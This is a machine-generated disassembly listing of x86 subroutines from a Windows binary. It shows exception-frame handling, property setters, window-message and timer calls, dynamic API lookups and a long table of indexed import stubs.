pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_463c4d
jmp sub_403a2c
sub_463c54
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
call sub_4032b0
retn
sub_463c6a
jmp sub_403a2c
sub_463d6b
jmp sub_403a2c
sub_463d72
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463d8f
mov eax [ ebp - 0x14 ]
call sub_4032b0
retn
sub_463d88
jmp sub_403a2c
sub_463dad
jmp sub_403a2c
sub_463e37
jmp sub_403a2c
sub_463e3e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_463e70
push ebx
mov ebx eax
mov eax ebx
call sub_418b4c
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x10 ]
call sub_422570
sub_463f34
push ebx
cmp [ eax + 0x72 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x74 ]
call [ ebx + 0x70 ]
sub_463f48
mov eax [ eax + 0x34 ]
mov eax [ eax + 0x54 ]
retn
sub_463f50
mov eax [ eax + 0x34 ]
mov [ eax + 0x54 ] edx
retn
sub_464315
jmp sub_403a2c
sub_46431c
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46441c
jmp sub_403a2c
sub_464423
pop ebp
retn
sub_4662a4
mov eax [ rw-data ]
retn
sub_4662ac
mov [ rw-data ] eax
retn
j_sub_403778#6
jmp sub_403778
sub_46642b
jmp sub_403a2c
sub_466432
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_466600
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_422400
pop ebp
retn 0x8
sub_466614
call sub_422498
retn
sub_466756
jmp sub_403a2c
sub_46675d
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_466801
jmp sub_403a2c
sub_466808
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_466898
mov al [ eax + 0x1f ]
xor al 0x1
retn
sub_466fc4
cmp edx [ eax + 0x28 ]
je r-xdata
retn
mov [ eax + 0x28 ] edx
mov [ eax + 0x2c ] 0x0
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_467670
sub_466fe0
cmp dl [ eax + 0x2c ]
je r-xdata
retn
mov [ eax + 0x2c ] dl
test dl dl
je r-xdata
mov edx 0xff000014
call sub_466fc4
sub_467100
cmp dl [ eax + 0x34 ]
je r-xdata
retn
mov [ eax + 0x34 ] dl
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_467670
sub_467118
cmp edx [ eax + 0x38 ]
je r-xdata
retn
mov [ eax + 0x38 ] edx
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_467670
sub_467130
mov ecx edx
mov [ eax + 0x10 ] ecx
test ecx ecx
jge r-xdata
mov eax [ eax + 0x4 ]
call sub_467670
retn
xor edx edx
mov [ eax + 0x10 ] edx
sub_46715c
mov eax [ eax + 0x4 ]
mov al [ eax + 0x210 ]
xor al 0x1
retn
sub_467168
mov [ eax + 0x1c ] dl
mov eax [ eax + 0x4 ]
call sub_467670
retn
sub_467448
push ebx
mov ebx edx
mov edx ebx
call sub_452ee0
and [ ebx + 0x24 ] 0xfffffffc
pop ebx
retn
sub_4674b8
cmp [ eax + 0x5c ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x1a8 ] 0x0
je r-xdata
mov al 0x1
retn
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
sub_4675e0
jmp sub_403a2c
sub_4675e7
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4675f0
push ebx
mov ebx eax
cmp [ ebx + 0x214 ] 0x0
jg r-xdata
pop ebx
retn
mov eax [ ebx + 0x208 ]
call sub_4669fc
mov eax [ ebx + 0x20c ]
call sub_4669fc
sub_467650
push esi
mov esi eax
mov eax [ esi + 0x208 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_467660
push esi
mov esi eax
mov eax [ esi + 0x20c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_46775b
jmp sub_403a2c
sub_467768
test edx edx
je r-xdata
retn
test [ edx + 0x1c ] 0x1
jne r-xdata
test [ eax + 0x1c ] 0x1
jne r-xdata
call sub_467780
sub_46799c
retn
sub_467a0a
jmp sub_403a2c
sub_467a49
jmp sub_403a2c
sub_467a7c
cmp [ edx + 0x8 ] 0x0
jne r-xdata
call sub_4543d8
retn
mov ecx [ eax + 0x208 ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov eax [ eax + 0x208 ]
call sub_466c88
retn
sub_467aa0
cmp [ edx + 0x8 ] 0x0
jne r-xdata
call sub_4543f8
retn
mov ecx [ eax + 0x20c ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov eax [ eax + 0x20c ]
call sub_466c88
retn
sub_467b95
jmp sub_403a2c
sub_467b9c
mov eax [ ebp - 0x4 ]
call sub_456358
test al al
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4668f0
mov eax [ ebp - 0x4 ]
call sub_467670
sub_467cd0
jmp sub_403a2c
sub_467d08
jmp sub_403a2c
sub_467d0f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467d2f
lea eax [ ebp - 0x114 ]
call sub_4040ac
retn
sub_467d28
jmp sub_403a2c
sub_467d2f
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_468036
jmp sub_403a2c
sub_46803d
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_40364c
sub_468091
jmp sub_403778
sub_46810d
jmp sub_403778
sub_468112
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_46f50c
call sub_403ae0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4684ca
jmp sub_403a2c
sub_4684d1
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4685ac
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41d00c
mov [ ebx + 0x270 ] eax
pop esi
pop ebx
retn
sub_4685c4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4685fc
mov edx eax
mov eax esi
call sub_41f224
pop esi
pop ebx
retn
sub_4685e0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4699a0
mov edx eax
mov eax esi
call sub_41f224
pop esi
pop ebx
retn
sub_4685fc
push ebx
mov ebx eax
mov eax ebx
call sub_469640
mov edx r-xdata
call sub_4254c4
pop ebx
retn
sub_468700
push ebx
mov ebx eax
mov eax ebx
call sub_468710
xor al 0x1
pop ebx
retn
sub_468710
cmp [ eax + 0x210 ] 0x0
jne r-xdata
mov al 0x1
retn
mov edx [ eax + 0x208 ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
mov eax [ eax + 0x20c ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
xor eax eax
retn
sub_46876c
push ebx
cmp [ eax + 0x292 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x294 ]
call [ ebx + 0x290 ]
sub_46878c
push ebx
cmp [ eax + 0x2b2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2b4 ]
call [ ebx + 0x2b0 ]
sub_4687ac
push ebx
cmp [ eax + 0x2ca ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2cc ]
call [ ebx + 0x2c8 ]
sub_468aa5
jmp sub_403a2c
sub_468aac
pop ecx
pop ebp
retn
sub_468ab0
xor eax eax
retn
sub_468d88
jmp sub_403a2c
sub_468d8f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_4032b0
retn
sub_468da5
jmp sub_403a2c
sub_468e8f
jmp sub_403a2c
sub_468e96
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468eb3
mov eax [ ebp - 0xc ]
call sub_4032b0
retn
sub_468eac
jmp sub_403a2c
sub_468ed3
jmp sub_403a2c
sub_4691be
jmp sub_403a2c
sub_469351
jmp sub_403a2c
sub_469640
mov eax [ eax + 0x238 ]
retn
sub_469648
mov eax [ eax + 0x240 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_469654
mov al [ eax + 0x5e ]
xor al 0x1
retn
sub_469992
jmp sub_403a2c
sub_469999
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4699a0
mov eax [ eax + 0x25c ]
test eax eax
jne r-xdata
retn
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
sub_4699e8
cmp dl [ eax + 0x230 ]
je r-xdata
retn
mov [ eax + 0x230 ] dl
test [ eax + 0x1c ] 0x10
jne r-xdata
call sub_4535f4
sub_469a04
cmp [ eax + 0x25c ] 0x0
setne al
retn
sub_469a40
push ebx
mov ebx eax
mov eax ebx
call sub_455588
mov eax [ ebx + 0x238 ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ eax + 0x14 ]
mov edx [ ebx + 0x70 ]
call sub_424bc0
sub_469ac4
push ebx
mov ebx eax
mov eax ebx
call sub_4555b0
mov eax [ ebx + 0x238 ]
test eax eax
je r-xdata
pop ebx
retn
mov edx [ ebx + 0x68 ]
call sub_425568
sub_469ae4
push ebx
mov ebx eax
mov eax ebx
call sub_469704
mov edx [ ebx + 0x248 ]
mov eax ebx
call sub_4697cc
pop ebx
retn
sub_46a311
lea eax [ ebp - 0xb4 ]
call sub_4040ac
retn
sub_46a31d
jmp sub_403a2c
j_sub_46a311
jmp sub_46a311
sub_46a324
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46a47c
jmp sub_403a2c
sub_46a483
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46a768
jmp sub_403a2c
sub_46a76f
mov eax [ rw-data ]
call sub_46d020
mov bl 0x1
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46a786
add [ eax ] al
retn
sub_46a9e4
push ebx
cmp [ eax + 0x2ba ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2bc ]
call [ ebx + 0x2b8 ]
sub_46aa04
mov eax [ eax + 0x240 ]
call sub_4297ec
test eax eax
jne r-xdata
retn
mov eax [ rw-data ]
call sub_46edc0
sub_46aaab
jmp sub_403a2c
sub_46aab2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46aad5
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_425540
retn
sub_46aace
jmp sub_403a2c
sub_46aad5
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46ac94
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_46aa04
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_46aefc
mov ecx [ eax + 0x248 ]
test ecx ecx
je r-xdata
retn
mov edx [ edx + 0x4 ]
mov eax ecx
call sub_462cb0
sub_46afe7
jmp sub_403a2c
sub_46afee
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46aff4
cmp [ eax + 0x22f ] 0x2
jne r-xdata
cmp [ edx + 0x4 ] 0x0
setne dl
call sub_46a7dc
test [ eax + 0x1c ] 0x10
je r-xdata
retn
sub_46b04c
call sub_46bd74
retn
sub_46b499
jmp sub_403a2c
sub_46b4a0
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46b79c
jmp sub_403778
sub_46bb38
jmp sub_403778
sub_46bc31
jmp sub_403a2c
sub_46bc38
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46bc55
lea eax [ ebp - 0x8 ]
call sub_4040ac
retn
sub_46bc4e
jmp sub_403a2c
sub_46bc55
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46bc5c
push ebx
mov ebx eax
mov eax [ ebx + 0x240 ]
call sub_4297ec
test eax eax
jne r-xdata
pop ebx
retn
xor edx edx
mov eax ebx
call sub_4686a4
sub_46bc7c
call sub_4032b0
retn
sub_46bcd4
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_46bd3a
jmp sub_403a2c
sub_46bee8
jmp sub_403778
sub_46bf14
xor edx edx
call sub_468a08
retn
sub_46bf1c
push ebx
mov ebx eax
mov dl 0x1
mov eax ebx
call sub_468a08
mov eax ebx
call sub_44fab4
pop ebx
retn
sub_46bfa2
jmp sub_403a2c
sub_46bfa9
pop ebx
pop ecx
pop ebp
retn
sub_46bfb0
push ebx
mov ebx eax
push 0x0
push 0x0
push 0xb021
mov eax ebx
call sub_456054
push eax
call PostMessageA
pop ebx
retn
sub_46c1b4
jmp sub_403a2c
sub_46c255
jmp sub_403a2c
sub_46c25f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c27e
mov eax [ rw-data ]
call sub_46e498
retn
sub_46c277
jmp sub_403a2c
sub_46c27e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c29b
lea eax [ ebp - 0x20 ]
call sub_4040ac
retn
sub_46c294
jmp sub_403a2c
sub_46c29b
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46c37c
cmp [ eax + 0x30 ] 0x0
jne r-xdata
call sub_44ec60
retn
mov edx eax
mov eax [ rw-data ]
call sub_46daec
retn
sub_46c700
mov edx eax
mov eax [ rw-data ]
call sub_46f50c
mov al 0x1
retn
sub_46c7e8
cmp dl [ eax + 0x2e0 ]
je r-xdata
retn
mov [ eax + 0x2e0 ] dl
call sub_46c710
sub_46c7fc
cmp dl [ eax + 0x2e1 ]
je r-xdata
retn
mov [ eax + 0x2e1 ] dl
call sub_46c710
sub_46c810
cmp edx [ eax + 0x2ec ]
je r-xdata
retn
mov [ eax + 0x2ec ] edx
call sub_46c710
sub_46c824
cmp dl [ eax + 0x2e8 ]
je r-xdata
retn
mov [ eax + 0x2e8 ] dl
call sub_46c710
sub_46c838
test [ eax + 0x1c ] 0x10
jne r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ eax + 0x2e0 ] 0x0
jne r-xdata
or [ edx + 0x8 ] 0x80000
cmp [ eax + 0x2e8 ] 0x0
je r-xdata
sub_46c9a3
jmp sub_403a2c
sub_46c9aa
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46c9b0
push ebx
mov ebx eax
mov eax ebx
call sub_45496c
mov eax ebx
call sub_454af0
test eax eax
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_46bfb0
sub_46cc26
jmp sub_403a2c
sub_46cc2d
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46cc34
push ebx
mov ebx edx
mov edx ebx
call sub_454dd4
mov eax [ ebx + 0x8 ]
xor edx edx
call sub_44ed68
pop ebx
retn
sub_46cc88
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_46ccf0
mov eax [ esp ]
add esp 0x10
pop ebx
retn
sub_46cca0
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_46ccf0
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_46ccbc
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_46ccf0
mov eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_46ccd4
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_46ccf0
mov eax [ esp + 0x8 ]
sub eax [ esp ]
add esp 0x10
pop ebx
retn
sub_46cf70
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_46cf7c
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_46cf88
push 0x4d
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_46cf94
push 0x4c
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_46cfa0
push 0x4f
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_46cfac
push 0x4e
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_46cfb8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x58 ]
call sub_4189b0
pop esi
pop ebx
retn
sub_46cfcc
mov edx [ eax + 0x58 ]
mov edx [ edx + 0x8 ]
test edx edx
jne r-xdata
mov eax edx
retn
push 0x50
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_46cfe8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_4189b0
pop esi
pop ebx
retn
sub_46cffc
mov eax [ eax + 0x4c ]
mov eax [ eax + 0x8 ]
retn
sub_46d004
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_4189b0
pop esi
pop ebx
retn
sub_46d018
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x8 ]
retn
sub_46d0f4
mov eax [ eax + 0x54 ]
call sub_418854
retn
sub_46d100
mov eax [ eax + 0x54 ]
call sub_418b4c
retn
sub_46d353
jmp sub_403a2c
sub_46d397
jmp sub_403a2c
sub_46d39e
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_46d3ec
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_46d1ec
mov eax esi
mov edx [ ebx + 0x38 ]
call sub_404100
pop esi
pop ebx
retn
sub_46d458
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x54 ]
call sub_4189b0
pop esi
pop ebx
retn
sub_46d46c
mov eax [ eax + 0x54 ]
mov eax [ eax + 0x8 ]
retn
sub_46d671
jmp sub_403a2c
sub_46d678
pop ebx
mov esp ebp
pop ebp
retn
sub_46d680
inc [ eax + 0x8c ]
retn
sub_46d688
dec [ eax + 0x8c ]
cmp [ eax + 0x8c ] 0x0
jne r-xdata
retn
test [ eax + 0x8e ] 0x10
je r-xdata
call sub_46d6a8
sub_46d6a8
xor edx edx
call sub_46daec
retn
sub_46dade
jmp sub_403a2c
sub_46db65
jmp sub_403a2c
sub_46db74
add eax 0x30
call sub_40d564
retn
sub_46dbb8
jmp r-xdata
test eax eax
je r-xdata
test eax eax
je r-xdata
cmp [ eax + 0x99 ] 0x0
je r-xdata
retn
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ eax + 0x30 ]
xor eax eax
sub_46dc09
jmp sub_403778
sub_46dc0e
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_46f50c
call sub_403ae0
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_46e2dd
jmp sub_403a2c
sub_46e2e4
pop ebx
mov esp ebp
pop ebp
retn
sub_46e46c
push ebx
inc [ eax + 0xb8 ]
cmp [ eax + 0xb8 ] 0x1
jne r-xdata
pop ebx
retn
cmp [ eax + 0xe2 ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_46e498
push ebx
dec [ eax + 0xb8 ]
cmp [ eax + 0xb8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0xea ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
sub_46e4c4
xor edx edx
call sub_46e3bc
retn
sub_46e4cc
mov dl 0x1
call sub_46e3bc
retn
sub_46e540
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_46e558
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x34 ] 0x1
je r-xdata
mov al 0x1
retn
sub_46e625
jmp sub_403a2c
sub_46e62c
pop esi
pop ebx
pop ecx
pop ebp
retn
j_sub_403778#5
jmp sub_403778
sub_46f374
push ebx
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop ebx
retn
mov ebx [ rw-data ]
mov ebx [ ebx ]
call ebx
sub_46f3ca
jmp sub_403778
sub_46f4b1
jmp sub_403778
sub_46f4ea
jmp sub_403a2c
sub_46f4f1
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46f4f8
call sub_40d0b4
test al al
je r-xdata
retn
push 0x0
call PostQuitMessage
sub_46f6f1
jmp sub_403a2c
sub_46f6f8
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_46f7bf
jmp sub_403a2c
sub_46f7c6
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46f99c
jmp sub_403a2c
sub_46f9a3
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46fa04
jmp sub_403a2c
sub_46fa0b
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46fa14
call sub_46f7dc
retn
sub_46fbff
jmp sub_403778
sub_46fc58
jmp sub_403a2c
sub_46fc5f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46fd8d
jmp sub_403a2c
sub_46feec
push ebx
mov ebx eax
mov ax [ ebx + 0x8a ]
test ax ax
je r-xdata
pop ebx
retn
movzx eax ax
push eax
push 0x0
call KillTimer
mov [ ebx + 0x8a ] 0x0
sub_4701eb
jmp sub_403a2c
sub_47021a
jmp sub_403a2c
sub_470326
jmp sub_403a2c
sub_47032d
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4706be
jmp sub_403a2c
sub_4706c5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4707e8
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_470833
add [ edx ] ch
push 0x0
push 0x0
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
retn
sub_470844
mov edx [ rw-data ]
mov [ edx + 0x4 ] eax
mov [ edx ] r-xdata
retn
sub_470854
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
retn
sub_4708c7
jmp sub_403a2c
sub_4708ce
pop ebp
retn
sub_4708d0
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_470864
call sub_403dfc
call sub_4707e8
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
mov eax sub_466580
call sub_418318
sub_470938
retn
sub_470939
jmp sub_403a2c
j_sub_470938
jmp sub_470938
sub_470940
pop ebp
retn
sub_470944
sub [ rw-data ] 0x1
retn
sub_471575
jmp sub_403a2c
sub_47157c
pop ebp
retn
sub_471580
sub [ rw-data ] 0x1
retn
sub_471865
jmp sub_403a2c
sub_47186c
pop ebp
retn
sub_471870
sub [ rw-data ] 0x1
retn
sub_471990
jmp sub_403a2c
sub_4719c8
push 0x0
push rw-data
call InterlockedExchange
test eax eax
je r-xdata
retn
push eax
call FreeLibrary
call sub_472828
sub_4719e4
mov eax 0x0
call sub_472774
jmp eax
sub_4719f0
retn
sub_4719f4
mov eax 0x1
call sub_472774
jmp eax
sub_471a00
retn
sub_471a04
mov eax 0x2
call sub_472774
jmp eax
sub_471a10
retn
sub_471a14
mov eax 0x3
call sub_472774
jmp eax
sub_471a20
retn
sub_471a24
mov eax 0x4
call sub_472774
jmp eax
sub_471a30
retn
sub_471a34
mov eax 0x5
call sub_472774
jmp eax
sub_471a40
retn
sub_471a44
mov eax 0x6
call sub_472774
jmp eax
sub_471a50
retn
sub_471a54
mov eax 0x7
call sub_472774
jmp eax
sub_471a60
retn
sub_471a64
mov eax 0x8
call sub_472774
jmp eax
sub_471a70
retn
sub_471a74
mov eax 0x9
call sub_472774
jmp eax
sub_471a80
retn
sub_471a84
mov eax 0xa
call sub_472774
jmp eax
sub_471a90
retn
sub_471a94
mov eax 0xb
call sub_472774
jmp eax
sub_471aa0
retn
sub_471aa4
mov eax 0xc
call sub_472774
jmp eax
sub_471ab0
retn
sub_471ab4
mov eax 0xd
call sub_472774
jmp eax
sub_471ac0
retn
sub_471ac4
mov eax 0xe
call sub_472774
jmp eax
sub_471ad0
retn
sub_471ad4
mov eax 0xf
call sub_472774
jmp eax
sub_471ae0
retn
sub_471ae4
mov eax 0x10
call sub_472774
jmp eax
sub_471af0
retn
sub_471af4
mov eax 0x11
call sub_472774
jmp eax
sub_471b00
retn
sub_471b04
mov eax 0x12
call sub_472774
jmp eax
sub_471b10
retn
sub_471b14
mov eax 0x13
call sub_472774
jmp eax
sub_471b20
retn
sub_471b24
mov eax 0x14
call sub_472774
jmp eax
sub_471b30
retn
sub_471b34
mov eax 0x15
call sub_472774
jmp eax
sub_471b40
retn
sub_471b44
mov eax 0x16
call sub_472774
jmp eax
sub_471b50
retn
sub_471b54
mov eax 0x17
call sub_472774
jmp eax
sub_471b60
retn
sub_471b64
mov eax 0x18
call sub_472774
jmp eax
sub_471b70
retn
sub_471b74
mov eax 0x19
call sub_472774
jmp eax
sub_471b80
retn
sub_471b84
mov eax 0x1a
call sub_472774
jmp eax
sub_471b90
retn
sub_471b94
mov eax 0x1b
call sub_472774
jmp eax
sub_471ba0
retn
sub_471ba4
mov eax 0x1c
call sub_472774
jmp eax
sub_471bb0
retn
sub_471bb4
mov eax 0x1d
call sub_472774
jmp eax
sub_471bc0
retn
sub_471bc4
mov eax 0x1e
call sub_472774
jmp eax
sub_471bd0
retn
sub_471bd4
mov eax 0x1f
call sub_472774
jmp eax
sub_471be0
retn
sub_471be4
mov eax 0x20
call sub_472774
jmp eax
sub_471bf0
retn
sub_471bf4
mov eax 0x21
call sub_472774
jmp eax
sub_471c00
retn
sub_471c04
mov eax 0x22
call sub_472774
jmp eax
sub_471c10
retn
sub_471c14
mov eax 0x23
call sub_472774
jmp eax
sub_471c20
retn
sub_471c24
mov eax 0x24
call sub_472774
jmp eax
sub_471c30
retn
sub_471c34
mov eax 0x25
call sub_472774
jmp eax
sub_471c40
retn
sub_471c44
mov eax 0x26
call sub_472774
jmp eax
sub_471c50
retn
sub_471c54
mov eax 0x27
call sub_472774
jmp eax
sub_471c60
retn
sub_471c64
mov eax 0x28
call sub_472774
jmp eax
sub_471c70
retn
sub_471c74
mov eax 0x29
call sub_472774
jmp eax
sub_471c80
retn
sub_471c84
mov eax 0x2a
call sub_472774
jmp eax
sub_471c90
retn
sub_471c94
mov eax 0x2b
call sub_472774
jmp eax
sub_471ca0
retn
sub_471ca4
mov eax 0x2c
call sub_472774
jmp eax
sub_471cb0
retn
sub_471cb4
mov eax 0x2d
call sub_472774
jmp eax
sub_471cc0
retn
sub_471cc4
mov eax 0x2e
call sub_472774
jmp eax
sub_471cd0
retn
sub_471cd4
mov eax 0x2f
call sub_472774
jmp eax
sub_471ce0
retn
sub_471ce4
mov eax 0x30
call sub_472774
jmp eax
sub_471cf0
retn
sub_471cf4
mov eax 0x31
call sub_472774
jmp eax
sub_471d00
retn
sub_471d04
mov eax 0x32
call sub_472774
jmp eax
sub_471d10
retn
sub_471d14
mov eax 0x33
call sub_472774
jmp eax
sub_471d20
retn
sub_471d24
mov eax 0x34
call sub_472774
jmp eax
sub_471d30
retn
sub_471d34
mov eax 0x35
call sub_472774
jmp eax
sub_471d40
retn
sub_471d44
mov eax 0x36
call sub_472774
jmp eax
sub_471d50
retn
sub_471d54
mov eax 0x37
call sub_472774
jmp eax
sub_471d60
retn
sub_471d64
mov eax 0x38
call sub_472774
jmp eax
sub_471d70
retn
sub_471d74
mov eax 0x39
call sub_472774
jmp eax
sub_471d80
retn
sub_471d84
mov eax 0x3a
call sub_472774
jmp eax
sub_471d90
retn
sub_471d94
mov eax 0x3b
call sub_472774
jmp eax
sub_471da0
retn
sub_471da4
mov eax 0x3c
call sub_472774
jmp eax
sub_471db0
retn
sub_471db4
mov eax 0x3d
call sub_472774
jmp eax
sub_471dc0
retn
sub_471dc4
mov eax 0x3e
call sub_472774
jmp eax
sub_471dd0
retn
sub_471dd4
mov eax 0x3f
call sub_472774
jmp eax
sub_471de0
retn
sub_471de4
mov eax 0x40
call sub_472774
jmp eax
sub_471df0
retn
sub_471df4
mov eax 0x41
call sub_472774
jmp eax
sub_471e00
retn
sub_471e04
mov eax 0x42
call sub_472774
jmp eax
sub_471e10
retn
sub_471e14
mov eax 0x43
call sub_472774
jmp eax
sub_471e20
retn
sub_471e24
mov eax 0x44
call sub_472774
jmp eax
sub_471e30
retn
sub_471e34
mov eax 0x45
call sub_472774
jmp eax
sub_471e40
retn
sub_471e44
mov eax 0x46
call sub_472774
jmp eax
sub_471e50
retn
sub_471e54
mov eax 0x47
call sub_472774
jmp eax
sub_471e60
retn
sub_471e64
mov eax 0x48
call sub_472774
jmp eax
sub_471e70
retn
sub_471e74
mov eax 0x49
call sub_472774
jmp eax
sub_471e80
retn
sub_471e84
mov eax 0x4a
call sub_472774
